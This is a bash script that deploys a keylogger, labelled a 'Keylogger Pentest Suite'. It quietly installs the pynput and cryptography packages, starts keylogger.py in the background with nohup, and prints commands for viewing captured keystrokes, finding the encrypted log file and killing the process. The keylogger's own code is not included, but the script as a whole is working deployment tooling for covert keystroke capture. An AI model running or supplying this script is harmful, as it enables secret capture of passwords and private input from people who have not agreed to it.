#!/bin/bash
# 🔥 Universal Deploy Script

echo "🚀 Deploying Keylogger Pentest Suite..."

# Install silently
pip3 install -q pynput cryptography 2>/dev/null || pip install -q pynput cryptography 2>/dev/null

# Background execution
echo "[+] Starting capture..."
nohup python3 keylogger.py > keylog.out 2>&1 &
PID=$!
sleep 2

echo "✅ DEPLOYED! PID: $PID"
echo "📱 Status: ps aux | grep keylogger"
echo "👀 View:    python3 viewer.py -l 50"
echo "📁 Logs:    keystrokes.enc"
echo "🛑 Stop:    pkill -f keylogger"